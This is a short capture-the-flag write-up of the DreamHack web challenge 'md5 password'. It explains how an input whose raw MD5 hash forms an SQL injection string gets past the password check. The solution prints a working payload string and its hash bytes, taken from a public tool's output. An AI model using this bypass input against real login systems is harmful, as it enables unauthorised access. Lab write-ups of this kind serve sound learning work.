# md5 password — DreamHack

> **Room / Challenge:** md5 password (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** md5 password (web)
- **Link**: `https://dreamhack.io/wargame/challenges/337`
- **Level:** `2`
- **Date:** `17-11-2025`

---

## Goal

Injecting MD5 payload that has SQL Injection value to get the flag.

## My Solution

The source code of the page requires us to inject a value that when the md5 hash it becomes a sql injection payload that then helps us bypass the check and get the value. After some time googling I found this repo that has the same goal as this challenge and provides us the payload [HasherBasher](https://github.com/gen0cide/hasherbasher). From that repo, I used this value to get the flag:

```bash
[HASHERBASHER:cli]  INFO ===== Match Found =====
[HASHERBASHER:cli]  INFO Cracked In: 0.000172369 seconds
[HASHERBASHER:cli]  INFO  -- BEGIN RAW BYTES --
l���%'oR'5���[
[HASHERBASHER:cli]  INFO  -- END RAW BYTES --
[HASHERBASHER:cli]  INFO ===== Results =====

 Located String: DyrhGOYP0vxI2DtH8y
    Result Size: 16
   Result Bytes: [108 14 151 253 165 194 37 39 111 82 39 53 179 129 162 91]
     Result Hex: 6c0e97fda5c225276f522735b381a25b
```
